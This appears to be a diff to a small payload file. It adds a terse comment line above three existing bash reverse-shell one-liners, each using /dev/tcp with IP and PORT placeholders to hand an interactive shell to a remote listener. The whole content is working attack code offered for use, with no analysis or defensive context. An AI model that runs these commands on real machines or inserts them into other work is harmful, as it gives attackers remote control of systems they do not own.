@@ -1,3 +1,4 @@
+empty for a reason, this gets the job done.
 sh -i >& /dev/tcp/IP/PORT 0>&1
 0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196
 exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
